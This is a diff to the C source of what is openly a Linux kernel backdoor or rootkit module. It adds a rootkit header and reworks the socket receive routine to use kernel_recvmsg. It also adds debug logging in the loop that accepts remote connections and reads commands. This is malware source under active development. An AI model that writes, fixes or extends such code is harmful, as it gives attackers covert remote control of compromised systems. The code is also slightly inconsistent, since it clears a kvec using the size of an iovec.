@@ -1,3 +1,4 @@
+#include "rootkit.h"
 #include "backdoor.h"
 #include "cmd.h"
 
@@ -5,29 +6,34 @@ static struct kbackdoor_t *bkdoor = NULL;
 
 size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len)
 {
-	struct msghdr msghdr;
-	struct iovec iov;
+	struct msghdr msg;
+	struct kvec iov;
   mm_segment_t oldfs;
-	int size = 0;
+	size_t size = 0;
 
 	if (sock->sk == NULL)
 		return 0;
+
+  
+  memset(&iov, 0, sizeof(struct iovec));
+  memset(&msg, 0, sizeof(struct msghdr));
+
 
   // Setup IO vector for sock_recvmsg
 	iov.iov_base = buf;
 	iov.iov_len = len;
 
-	msghdr.msg_name = addr;
-	msghdr.msg_namelen = sizeof(struct sockaddr_in);
-	msghdr.msg_iter.iov = &iov;
-	msghdr.msg_control = NULL;
-	msghdr.msg_controllen = 0;
-	msghdr.msg_flags = 0;
+	msg.msg_name = addr;
+	msg.msg_namelen = sizeof(struct sockaddr_in);
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_flags = 0;
 
   oldfs = get_fs();
   set_fs(KERNEL_DS);
-	size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
+	size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
   set_fs(oldfs);
+  printk(KERN_INFO "Received %ld: %s\n", size, buf);
 
 	return size;
 }
@@ -84,7 +90,7 @@ int backdoor_run(void *data)
     return err;
   }
 
-  printk(KERN_INFO "Listen successful\n");
+  debug("Listen successful\n");
 
   // Create a socket to accept connections
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
@@ -122,6 +128,7 @@ int backdoor_run(void *data)
     printk(KERN_INFO "Received a new connection\n");
 
     size = backdoor_recv(bkdoor->conn, &bkdoor->addr, buffer, sizeof(buffer));
+    printk(KERN_INFO "Received %ld bytes: %s\n", size, buffer);
 
     // If size < 0, connection probably closed
     if (size < 0) { break; }
